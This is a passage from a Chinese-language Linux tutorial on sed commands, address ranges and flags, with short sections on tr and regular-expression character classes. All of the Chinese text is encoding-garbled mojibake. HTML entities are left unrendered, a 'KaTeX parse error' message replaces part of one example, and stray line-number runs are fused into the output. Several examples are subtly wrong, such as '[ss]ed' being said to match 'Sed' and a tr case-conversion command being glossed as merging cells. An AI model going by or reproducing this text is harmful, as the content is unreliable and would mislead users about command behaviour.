ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç¬¬äºŒä¸ªå­—ç¬¦ä¼šè¢«è½¬æ¢æˆ outchars ä¸­çš„ç¬¬äºŒä¸ªå­—ç¬¦â€¦è¿™ä¸ªæ˜ å°„è¿‡ç¨‹ä¼šä¸€ç›´æŒç»­åˆ°å¤„ç†å®ŒæŒ‡å®šå­—ç¬¦ã€‚å¦‚æœ inchars å’Œ outchars çš„é•¿åº¦ä¸åŒï¼Œåˆ™ sed ä¼šäº§ç”Ÿä¸€æ¡é”™è¯¯æ¶ˆæ¯ã€‚d åˆ é™¤ï¼Œåˆ é™¤é€‰æ‹©çš„è¡Œ;D åˆ é™¤æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œ;s æ›¿æ¢æŒ‡å®šå­—ç¬¦;h æ‹·è´æ¨¡æ¿å—çš„å†…å®¹åˆ°å†…å­˜ä¸­çš„ç¼“å†²åŒº;H è¿½åŠ æ¨¡æ¿å—çš„å†…å®¹åˆ°å†…å­˜ä¸­çš„ç¼“å†²åŒº;g è·å¾—å†…å­˜ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶æ›¿ä»£å½“å‰æ¨¡æ¿å—ä¸­çš„æ–‡æœ¬;G è·å¾—å†…å­˜ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶è¿½åŠ åˆ°å½“å‰æ¨¡æ¿å—æ–‡æœ¬çš„åé¢;l åˆ—è¡¨ä¸èƒ½æ‰“å°å­—ç¬¦çš„æ¸…å•;n è¯»å–ä¸‹ä¸€ä¸ªè¾“å…¥è¡Œï¼Œç”¨ä¸‹ä¸€ä¸ªå‘½ä»¤å¤„ç†æ–°çš„è¡Œè€Œä¸æ˜¯ç”¨ç¬¬ä¸€ä¸ªå‘½ä»¤;N è¿½åŠ ä¸‹ä¸€ä¸ªè¾“å…¥è¡Œåˆ°æ¨¡æ¿å—åé¢å¹¶åœ¨äºŒè€…é—´åµŒå…¥ä¸€ä¸ªæ–°è¡Œï¼Œæ”¹å˜å½“å‰è¡Œå·ç ;p æ‰“å°æ¨¡æ¿å—çš„è¡Œï¼Œå³æœç´¢ç¬¦å·æ¡ä»¶çš„è¡Œï¼Œå¹¶è¾“å‡ºè¯¥è¡Œçš„å†…å®¹ã€‚ P(å¤§å†™) æ‰“å°æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œ;q é€€å‡ºSed;b lable åˆ†æ”¯åˆ°è„šæœ¬ä¸­å¸¦æœ‰æ ‡è®°çš„åœ°æ–¹ï¼Œå¦‚æœåˆ†æ”¯ä¸å­˜åœ¨åˆ™åˆ†æ”¯åˆ°è„šæœ¬çš„æœ«å°¾;r file ä»fileä¸­è¯»è¡Œ;t label ifåˆ†æ”¯ï¼Œä»æœ€åä¸€è¡Œå¼€å§‹ï¼Œæ¡ä»¶ä¸€æ—¦æ»¡è¶³æˆ–è€…Tï¼Œtå‘½ä»¤ï¼Œå°†å¯¼è‡´åˆ†æ”¯åˆ°å¸¦æœ‰æ ‡å·çš„å‘½ä»¤å¤„ï¼Œæˆ–è€…åˆ°è„šæœ¬çš„æœ«å°¾;T label é”™è¯¯åˆ†æ”¯ï¼Œä»æœ€åä¸€è¡Œå¼€å§‹ï¼Œä¸€æ—¦å‘ç”Ÿé”™è¯¯æˆ–è€…Tï¼Œtå‘½ä»¤ï¼Œå°†å¯¼è‡´åˆ†æ”¯åˆ°å¸¦æœ‰æ ‡å·çš„å‘½ä»¤å¤„ï¼Œæˆ–è€…åˆ°è„šæœ¬çš„æœ«å°¾;w file å†™å¹¶è¿½åŠ æ¨¡æ¿å—åˆ°fileæœ«å°¾;W file å†™å¹¶è¿½åŠ æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œåˆ°fileæœ«å°¾;! è¡¨ç¤ºåé¢çš„å‘½ä»¤å¯¹æ‰€æœ‰æ²¡æœ‰è¢«é€‰å®šçš„è¡Œå‘ç”Ÿä½œç”¨;&#x3D; æ‰“å°å½“å‰è¡Œå·; æŠŠæ³¨é‡Šæ‰©å±•åˆ°ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä»¥å‰;ã€æ–‡æœ¬æ›¿æ¢å‚æ•°ã€‘ï¼šg è¡¨ç¤ºè¡Œå†…å…¨é¢æ›¿æ¢; p è¡¨ç¤ºæ‰“å°è¡Œ; w è¡¨ç¤ºæŠŠè¡Œå†™å…¥ä¸€ä¸ªæ–‡ä»¶; x è¡¨ç¤ºäº’æ¢æ¨¡æ¿å—ä¸­çš„æ–‡æœ¬å’Œç¼“å†²åŒºä¸­çš„æ–‡æœ¬; y è¡¨ç¤ºæŠŠä¸€ä¸ªå­—ç¬¦ç¿»è¯‘ä¸ºå¦å¤–çš„å­—ç¬¦ï¼ˆä½†æ˜¯ä¸ç”¨äºæ­£åˆ™è¡¨è¾¾å¼ï¼‰; \\1 å­ä¸²åŒ¹é…æ ‡è®°; &amp; å·²åŒ¹é…å­—ç¬¦ä¸²æ ‡è®°; ã€æ–‡æœ¬åŒ¹é…ã€‘ï¼š ^ åŒ¹é…è¡Œå¼€å§‹ï¼Œå¦‚ï¼š&#x2F;^sed&#x2F;åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œ; $ åŒ¹é…è¡Œç»“æŸï¼Œå¦‚ï¼š&#x2F;sed$&#x2F;åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œ; . åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ï¼Œå¦‚ï¼š&#x2F;s.d&#x2F;åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œæœ€åæ˜¯d; åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œå¦‚ï¼š&#x2F;*sed&#x2F;åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼åç´§è·Ÿsedçš„è¡Œ;[] åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚&#x2F;[ss]ed&#x2F;åŒ¹é…sedå’ŒSed; [^] åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š&#x2F;[^A-RT-Z]ed&#x2F;åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œ; (â€¦) åŒ¹é…å­ä¸²ï¼Œä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s&#x2F;(love)able&#x2F;\\1rsï¼Œloveableè¢«æ›¿æ¢æˆlovers; &amp; ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚s&#x2F;love&#x2F;&amp;&#x2F;ï¼Œloveè¿™æˆlove; &lt; åŒ¹é…å•è¯çš„å¼€å§‹ï¼Œå¦‚:&#x2F;\\ åŒ¹é…å•è¯çš„ç»“æŸï¼Œå¦‚&#x2F;love&gt;&#x2F;åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œ; x{m} é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š&#x2F;0{5}&#x2F;åŒ¹é…åŒ…å«5ä¸ª0çš„è¡Œ; x{m,} é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š&#x2F;0{5,}&#x2F;åŒ¹é…è‡³å°‘æœ‰5ä¸ª0çš„è¡Œ; x{m,n} é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š&#x2F;0{5,10}&#x2F;åŒ¹é…5~10ä¸ª0çš„è¡Œ; å‘½ä»¤ç¤ºä¾‹ï¼š æµ‹è¯•æ–‡ä»¶ï¼š#cat sed.txtdate schooL teaChertea Car red Hell0Centos liNux 1ï¼‰sed â€˜s&#x2F;date&#x2F;Date&#x2F;â€™ sed.txt 2ï¼‰sed -n â€˜s&#x2F;date&#x2F;Date&#x2F;pâ€™ sed.txt &#x2F;&#x2F;-n é€‰é¡¹ä¼šç¦æ­¢ sed è¾“å‡ºï¼Œä½† p æ ‡è®°ä¼šè¾“å‡ºä¿®æ”¹è¿‡çš„è¡Œ,-né€‰é¡¹å’Œpå‘½ä»¤ä¸€èµ·ä½¿ç”¨è¡¨ç¤ºåªæ‰“å°é‚£äº›å‘ç”Ÿæ›¿æ¢çš„è¡Œï¼š 3ï¼‰sed â€˜s&#x2F;date&#x2F;Date&#x2F;2â€™ sed.txt &#x2F;&#x2F;ä½¿ç”¨æ•°å­— 2 ä½œä¸ºæ ‡è®°çš„ç»“æœå°±æ˜¯ï¼Œsed ç¼–è¾‘å™¨åªæ›¿æ¢æ¯è¡Œä¸­ç¬¬ 2 æ¬¡å‡ºç°çš„åŒ¹é…æ¨¡å¼ sed â€˜s&#x2F;date&#x2F;Date&#x2F;w test.txtâ€™ sed.txt &#x2F;&#x2F;w æ ‡è®°ä¼šå°†åŒ¹é…åçš„ç»“æœä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ sed â€˜3dâ€™ sed.txt &#x2F;&#x2F;åˆ é™¤ sed.txt æ–‡ä»¶å†…å®¹ä¸­çš„ç¬¬ 3 è¡Œ,å¦‚æœä¸æŒ‡å®šåˆ é™¤è¡Œï¼Œsedæ–‡ä»¶å†…å®¹å°†å…¨éƒ¨åˆ é™¤ï¼Œè¯·æ…é‡ 6)sed â€˜2,3dâ€™ sed.txt &#x2F;&#x2F;åˆ é™¤ sed.txt æ–‡ä»¶å†…å®¹ä¸­çš„ç¬¬ 2ã€3è¡Œ 7)sed â€˜&#x2F;1&#x2F;,&#x2F;3&#x2F;dâ€™ sed.txt &#x2F;&#x2F;åˆ é™¤ç¬¬ 1~3 è¡Œçš„æ–‡æœ¬æ•°æ®ï¼Œç”¨ä¸¤ä¸ªæ–‡æœ¬æ¨¡å¼æ¥åˆ é™¤æŸä¸ªåŒºé—´å†…çš„è¡Œï¼Œè¦å°å¿ƒæŒ‡å®šçš„ç¬¬ä¸€ä¸ªæ¨¡å¼ä¼šâ€œæ‰“å¼€â€è¡Œåˆ é™¤åŠŸèƒ½ï¼Œç¬¬äºŒä¸ªæ¨¡å¼ä¼šâ€œå…³é—­â€è¡Œåˆ é™¤åŠŸèƒ½ï¼Œå› æ­¤ï¼Œsed ä¼šåˆ é™¤ä¸¤ä¸ªæŒ‡å®šè¡Œä¹‹é—´çš„æ‰€æœ‰è¡Œï¼ˆåŒ…æ‹¬æŒ‡å®šçš„è¡Œï¼‰ 8ï¼‰sed â€˜3,$dâ€™ sed.txt &#x2F;&#x2F;åˆ é™¤ sed.txt æ–‡ä»¶å†…å®¹ä¸­ç¬¬ 3 è¡Œå¼€å§‹çš„æ‰€æœ‰çš„å†…å®¹,é»˜è®¤æƒ…å†µä¸‹ sed å¹¶ä¸ä¼šä¿®æ”¹åŸå§‹æ–‡ä»¶ï¼Œè¿™é‡Œè¢«åˆ é™¤çš„è¡Œåªæ˜¯ä» sed çš„è¾“å‡ºä¸­æ¶ˆå¤±äº†ï¼ŒåŸå§‹æ–‡ä»¶æ²¡åšä»»ä½•æ”¹å˜ã€‚ 9)sed â€˜3i\\This is an inserted line.â€™ sed.txt &#x2F;&#x2F;å°†ä¸€ä¸ªæ–°è¡Œæ’å…¥åˆ°æ•°æ®æµç¬¬ä¸‰è¡Œå‰,å°†iæ”¹ä¸ºaï¼Œå°±è¡¨ç¤ºå°†ä¸€ä¸ªæ–°è¡Œé™„åŠ åˆ°æ•°æ®æµä¸­ç¬¬ä¸‰è¡Œå 10)å°†ä¸€ä¸ªå¤šè¡Œæ•°æ®æ·»åŠ åˆ°æ•°æ®æµä¸­ï¼Œåªéœ€å¯¹è¦æ’å…¥æˆ–é™„åŠ çš„æ–‡æœ¬ä¸­çš„æ¯ä¸€è¡Œæœ«å°¾ï¼ˆé™¤æœ€åä¸€è¡Œï¼‰æ·»åŠ åæ–œçº¿å³å¯ï¼šsed â€˜1i\\ This is one line of new text.This is another line of new text.â€™ sed.txt ##&#x2F;&#x2F;ç¬¬1è¡Œå‰æ’å…¥2è¡Œ 11ï¼‰sed â€˜3c\\This is a changed line of text.â€™ sed.txt &#x2F;&#x2F;sed ç¼–è¾‘å™¨ä¼šä¿®æ”¹ç¬¬ä¸‰è¡Œä¸­çš„æ–‡æœ¬,å°†ç¬¬2è¡Œä¿®æ”¹&#x2F;æ›¿æ¢ä¸ºæ–°å†…å®¹ 12ï¼‰echo â€œThis 1 is a test of 1 try.â€ | sed â€˜y&#x2F;123&#x2F;456&#x2F;â€™ &#x2F;&#x2F;è¾“å‡ºå¦‚ä¸‹ï¼Œå› yå­—ç¬¦æ›¿æ¢æ˜¯å…¨å±€å‘½ä»¤ï¼Œå®ƒä¼šæ–‡æœ¬è¡Œä¸­æ‰¾åˆ°çš„æ‰€æœ‰æŒ‡å®šå­—ç¬¦è‡ªåŠ¨è¿›è¡Œè½¬æ¢ï¼Œè€Œä¸ä¼šè€ƒè™‘å®ƒä»¬å‡ºç°çš„ä½ç½®ï¼Œæ— æ³•é™å®šåªè½¬æ¢åœ¨ç‰¹å®šåœ°æ–¹å‡ºç°çš„å­—ç¬¦This 4 is a test of 4 try. 13ï¼‰ sed -n â€˜&#x2F;number 3&#x2F;pâ€™ sed.txt &#x2F;&#x2F;ç”¨ -n é€‰é¡¹å’Œ p å‘½ä»¤é…åˆä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ç¦æ­¢è¾“å‡ºå…¶ä»–è¡Œï¼Œåªæ‰“å°åŒ…å«åŒ¹é…æ–‡æœ¬æ¨¡å¼çš„è¡Œ,ç”¨äºåªæŸ¥çœ‹ç‰¹å®šè¡Œçš„å†…å®¹ 14ï¼‰å¦‚éœ€è¦åœ¨ä¿®æ”¹ä¹‹å‰æŸ¥ç¡®è®¤è¯¥è¡Œï¼Œå¯ä»¥ä½¿ç”¨æ‰“å°å‘½ä»¤ï¼Œä¸æ›¿æ¢æˆ–ä¿®æ”¹å‘½ä»¤ä¸€èµ·ä½¿ç”¨ï¼Œsed å‘½ä»¤ä¼šæŸ¥æ‰¾åŒ…å«æ•°å­— 3 çš„è¡Œï¼Œç„¶åæ‰§è¡Œä¸¤æ¡å‘½ä»¤ã€‚é¦–å…ˆï¼Œè„šæœ¬ç”¨ p å‘½ä»¤æ¥æ‰“å°å‡ºåŸå§‹è¡Œï¼›ç„¶åå®ƒç”¨ s å‘½ä»¤æ›¿æ¢æ–‡æœ¬ï¼Œå¹¶ç”¨ p æ ‡è®°æ‰“å°å‡ºæ›¿æ¢ç»“æœã€‚è¾“å‡ºåŒæ—¶æ˜¾ç¤ºäº†åŸæ¥çš„è¡Œæ–‡æœ¬å’Œæ–°çš„è¡Œæ–‡æœ¬ã€‚ sed -n â€˜&#x2F;3&#x2F;{ ps&#x2F;line&#x2F;test&#x2F;p}â€™ data6.txtThis is line number 3.This is test number 3.12345615ï¼‰r å‘½ä»¤ç”¨äºå°†ä¸€ä¸ªç‹¬ç«‹æ–‡ä»¶çš„æ•°æ®æ’å…¥åˆ°å½“å‰æ•°æ®æµçš„æŒ‡å®šä½ç½® [root@localhost ~]# cat data12.txtThis is an added line.This is the second added line.[root@localhost ~]# sed â€˜3r data12.txtâ€™ data6.txtThis is line number 1.This is line number 2.This is line number 3.This is an added line.This is the second added line.This is line number 4.12345678910å°†æŒ‡å®šæ–‡ä»¶ä¸­çš„æ•°æ®æ’å…¥åˆ°æ•°æ®æµçš„æœ«å°¾ï¼Œå¯ä»¥ä½¿ç”¨ $ åœ°å€ç¬¦ï¼š sed â€˜$r data12.txtâ€™ data6.txtThis is line number 1.This is line number 2.This is line number 3.This is line number 4.This is an added line.This is the second added line.123456716ï¼‰sed â€˜&#x2F;number 1&#x2F;{ s&#x2F;number 1&#x2F;number 0&#x2F;;q; }â€™ test.txt &#x2F;&#x2F;sed å‘½ä»¤ä¼šåœ¨åŒ¹é…åˆ° number 1 æ—¶ï¼Œå°†å…¶æ›¿æ¢æˆ number 0ï¼Œç„¶åç›´æ¥é€€å‡º 17)é»˜è®¤æƒ…å†µä¸‹ï¼Œsed å‘½ä»¤ä¼šä½œç”¨äºæ–‡æœ¬æ•°æ®çš„æ‰€æœ‰è¡Œã€‚å¦‚æœåªæƒ³å°†å‘½ä»¤ä½œç”¨äºç‰¹å®šè¡Œæˆ–æŸäº›è¡Œï¼Œåˆ™å¿…é¡»å†™æ˜ address éƒ¨åˆ†ï¼Œè¡¨ç¤ºçš„æ–¹æ³•æœ‰ä»¥ä¸‹ 2 ç§ï¼šaã€ä»¥æ•°å­—å½¢å¼æŒ‡å®šè¡ŒåŒºé—´ï¼› eg1:sed â€˜2s&#x2F;dog&#x2F;cat&#x2F;â€™ data1.txt &#x2F;&#x2F;sed åªä¿®æ”¹åœ°å€æŒ‡å®šçš„ç¬¬äºŒè¡Œçš„æ–‡æœ¬eg2:sed â€˜2,3s&#x2F;dog&#x2F;cat&#x2F;â€™ data1.txt &#x2F;&#x2F;ä¿®æ”¹æŒ‡å®šçš„ç¬¬äºŒè¡Œåˆ°ç¬¬ä¸‰è¡ŒåŒ…æ‹¬2è€…çš„æ–‡æœ¬eg3ï¼šsed â€˜2,$s&#x2F;dog&#x2F;cat&#x2F;â€™ data1.txt &#x2F;&#x2F;ä¿®æ”¹æ–‡æœ¬ä¸­ä»æŸè¡Œå¼€å§‹çš„æ‰€æœ‰è¡Œ bã€ç”¨æ–‡æœ¬æ¨¡å¼æŒ‡å®šå…·ä½“è¡ŒåŒºé—´ã€‚ [address]è„šæœ¬å‘½ä»¤ æˆ–è€… address { å¤šä¸ªè„šæœ¬å‘½ä»¤} &#x2F;&#x2F;ä¸Šä¾‹ä¸­çš„&#x2F;number 1&#x2F;å°±æ˜¯æŒ‡å®šäº†åŒ¹é…çš„address123456718ï¼‰ç”¨æ–‡æœ¬æ¨¡å¼æŒ‡å®šè¡ŒåŒºé—´ï¼š&#x2F;pattern&#x2F;commandï¼›å¿…é¡»ç”¨æ­£æ–œçº¿å°†è¦æŒ‡å®šçš„ pattern å°èµ·æ¥ï¼Œsed ä¼šå°†è¯¥å‘½ä»¤ä½œç”¨åˆ°åŒ…å«æŒ‡å®šæ–‡æœ¬æ¨¡å¼çš„è¡Œä¸Š eg1ï¼šsed â€˜&#x2F;demo&#x2F;s&#x2F;bash&#x2F;csh&#x2F;â€™ &#x2F;etc&#x2F;passwd &#x2F;&#x2F;åªä¿®æ”¹ç”¨æˆ· demo çš„é»˜è®¤ shell åœ¨æ–‡æœ¬æ¨¡å¼ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æŒ‡æ˜ä½œç”¨çš„å…·ä½“è¡Œã€‚æ­£åˆ™è¡¨è¾¾å¼å…è®¸åˆ›å»ºé«˜çº§æ–‡æœ¬æ¨¡å¼åŒ¹é…è¡¨è¾¾å¼æ¥åŒ¹é…å„ç§æ•°æ®ã€‚è¿™äº›è¡¨è¾¾å¼ç»“åˆäº†ä¸€ç³»åˆ—é€šé…ç¬¦ã€ç‰¹æ®Šå­—ç¬¦ä»¥åŠå›ºå®šæ–‡æœ¬å­—ç¬¦æ¥ç”Ÿæˆèƒ½å¤ŸåŒ¹é…å‡ ä¹ä»»ä½•å½¢å¼æ–‡æœ¬çš„ç®€ç»ƒæ¨¡å¼ã€‚ 19ï¼‰å…¶ä»–ç”¨æ³•ï¼šsed â€˜&#x2F;^KaTeX parse error: Expected â€˜EOFâ€™, got â€˜#â€™ at position 48: â€¦é™¤æ‰€æœ‰ç©ºç™½è¡Œ sed â€˜&#x2F; *#Ì²&#x2F;d; &#x2F;^&#x2F;dâ€™ example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰æ³¨é‡Šå’Œç©ºç™½è¡Œecho â€˜esempioâ€™ | tr â€˜[:lower:]â€™ â€˜[:upper:]â€™ åˆå¹¶ä¸Šä¸‹å•å…ƒæ ¼å†…å®¹sed -e â€˜1dâ€™ result.txt ä»æ–‡ä»¶example.txt ä¸­æ’é™¤ç¬¬ä¸€è¡Œsed -n â€˜&#x2F;stringa1&#x2F;pâ€™ æŸ¥çœ‹åªåŒ…å«è¯æ±‡ â€œstring1â€çš„è¡Œsed -e â€˜s&#x2F; $&#x2F;&#x2F;â€™ example.txt åˆ é™¤æ¯ä¸€è¡Œæœ€åçš„ç©ºç™½å­—ç¬¦sed -e â€˜s&#x2F;stringa1&#x2F;&#x2F;gâ€™ example.txt ä»æ–‡æ¡£ä¸­åªåˆ é™¤è¯æ±‡ â€œstring1â€ å¹¶ä¿ç•™å‰©ä½™å…¨éƒ¨sed -n â€˜1,5p;5qâ€™ example.txt æŸ¥çœ‹ä»ç¬¬ä¸€è¡Œåˆ°ç¬¬5è¡Œå†…å®¹sed -n â€˜5p;5qâ€™ example.txt æŸ¥çœ‹ç¬¬5è¡Œsed -e â€˜s&#x2F;00&#x2F;0&#x2F;gâ€™ example.txt ç”¨å•ä¸ªé›¶æ›¿æ¢å¤šä¸ªé›¶cat -n file1 æ ‡ç¤ºæ–‡ä»¶çš„è¡Œæ•°cat example.txt | awk â€˜NR%2&#x3D;&#x3D;1â€™ åˆ é™¤example.txtæ–‡ä»¶ä¸­çš„æ‰€æœ‰å¶æ•°è¡Œecho a b c | awk â€˜{print $1}â€™ æŸ¥çœ‹ä¸€è¡Œç¬¬ä¸€æ echo a b c | awk â€˜{print $1,$3}â€™ æŸ¥çœ‹ä¸€è¡Œçš„ç¬¬ä¸€å’Œç¬¬ä¸‰æ paste file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹paste -d â€˜+â€™ file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹ï¼Œä¸­é—´ç”¨â€+â€åŒºåˆ†sort file1 file2 æ’åºä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹sort file1 file2 | uniq å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„å¹¶é›†(é‡å¤çš„è¡Œåªä¿ç•™ä¸€ä»½)sort file1 file2 | uniq -u åˆ é™¤äº¤é›†ï¼Œç•™ä¸‹å…¶ä»–çš„è¡Œsort file1 file2 | uniq -d å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„äº¤é›†(åªç•™ä¸‹åŒæ—¶å­˜åœ¨äºä¸¤ä¸ªæ–‡ä»¶ä¸­çš„æ–‡ä»¶)comm -1 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ â€˜file1â€™ æ‰€åŒ…å«çš„å†…å®¹comm -2 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ â€˜file2â€™ æ‰€åŒ…å«çš„å†…å®¹comm -3 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ä¸¤ä¸ªæ–‡ä»¶å…±æœ‰çš„éƒ¨åˆ† 20ï¼‰ç‰¹æ®Šç”¨æ³•ï¼š 10.5 ã€trï¼ˆTranslateæ›¿æ¢&#x2F;è½¬è¯‘ï¼‰å‘½ä»¤ç”¨äºæ›¿æ¢&#x2F;è½¬åŒ–ï¼ˆå¤§å°å†™è½¬åŒ–ï¼‰ã€å‹ç¼©é‡å¤å’Œ&#x2F;æˆ–åˆ é™¤æ ‡å‡†è¾“å…¥ä¸­çš„å­—ç¬¦ï¼Œå†™å…¥æ ‡å‡†è¾“å‡ºã€‚åœ¨æ²¡æœ‰ä»»ä½•å‚æ•°é€‰é¡¹æ—¶ï¼Œé»˜è®¤æ˜¯æ›¿æ¢ï¼Œä¸åŠ ä¸Š-så‚æ•°é€‰é¡¹ç»“æœæ˜¯ä¸€è‡´çš„ã€‚ è¯­æ³•ï¼štr [OPTION]â€¦SET1[SET2]å‚æ•°: -c, â€“complementï¼šåé€‰è®¾å®šå­—ç¬¦ã€‚ä¹Ÿå°±æ˜¯ç¬¦åˆ SET1 çš„éƒ¨ä»½ä¸åšå¤„ç†ï¼Œä¸ç¬¦åˆçš„å‰©ä½™éƒ¨ä»½æ‰è¿›è¡Œè½¬æ¢-d, â€“deleteï¼šåˆ é™¤æŒ‡ä»¤å­—ç¬¦-s, â€“squeeze-repeatsï¼šç¼©å‡è¿ç»­é‡å¤çš„å­—ç¬¦æˆæŒ‡å®šçš„å•ä¸ªå­—ç¬¦-t, â€“truncate-set1ï¼šå‰Šå‡ SET1 æŒ‡å®šèŒƒå›´ï¼Œä½¿ä¹‹ä¸ SET2 è®¾å®šé•¿åº¦ç›¸ç­‰â€“helpï¼šæ˜¾ç¤ºç¨‹åºç”¨æ³•ä¿¡æ¯â€“versionï¼šæ˜¾ç¤ºç¨‹åºæœ¬èº«çš„ç‰ˆæœ¬ä¿¡æ¯ 11ã€æ­£åˆ™è¡¨è¾¾å¼(regular expression):æ­£åˆ™è¡¨è¾¾å¼(regular expression)æ˜¯ä¸€ç§æ–‡æœ¬æ¨¡å¼ï¼Œæè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpattern)ï¼ŒåŒ…æ‹¬æ™®é€šå­—ç¬¦ï¼ˆä¾‹å¦‚ï¼Œa åˆ° z ä¹‹é—´çš„å­—æ¯ï¼‰å’Œç‰¹æ®Šå­—ç¬¦ï¼ˆç§°ä¸ºâ€œå…ƒå­—ç¬¦â€ï¼‰ã€‚ä½¿ç”¨è¯¥æ¨¡å¼ï¼Œå¯ä»¥ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸²ã€å°†åŒ¹é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»æŸä¸ªä¸²ä¸­å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶çš„å­ä¸²ç­‰ã€‚æˆ–è¿™ç§æ¨¡å¼ï¼Œæè¿°äº†åœ¨æœç´¢æ–‡æœ¬æ—¶è¦åŒ¹é…çš„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ã€‚æ­£åˆ™è¡¨è¾¾å¼ä½œä¸ºä¸€ä¸ªæ¨¡æ¿ï¼Œå°†æŸä¸ªå­—ç¬¦æ¨¡å¼ä¸æ‰€æœç´¢çš„å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ã€‚æ¨¡å¼ä¸­ç”±5ç±»å­—ç¬¦ç»„æˆï¼š 1ï¼‰æ™®é€šå­—ç¬¦[A-Za-z0-9_] &#x2F;&#x2F;æ‰€æœ‰å¤§å†™å’Œå°å†™å­—æ¯ã€æ‰€æœ‰æ•°å­—ã€æ‰€æœ‰æ ‡ç‚¹ç¬¦å·å’Œä¸€äº›å…¶ä»–ç¬¦å· 2ï¼‰éæ‰“å°å­—ç¬¦\\cx åŒ¹é…ç”±xæŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ \\cM åŒ¹é…ä¸€ä¸ª Control-M æˆ–å›è½¦ç¬¦ã€‚x çš„å€¼å¿…é¡»ä¸º A-Z æˆ– a-z ä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°† c è§†ä¸ºä¸€ä¸ªåŸä¹‰çš„ â€˜câ€™ å­—ç¬¦ã€‚\\f åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº \\x0c å’Œ \\cLã€‚\\n åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº \\x0a å’Œ \\cJã€‚\\r åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº \\x0d å’Œ \\cMã€‚\\s åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº [ \\f\\n\\r\\t\\v]ã€‚æ³¨æ„ Unicode æ­£åˆ™è¡¨è¾¾å¼ä¼šåŒ¹é…å…¨è§’ç©ºæ ¼ç¬¦ã€‚\\S åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº [^ \\f\\n\\r\\t\\v]ã€‚\\t åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº \\x09 å’Œ \\cIã€‚\\v åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº \\x0b å’Œ \\cKã€‚\\w åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº [A-Za-z0-9_] 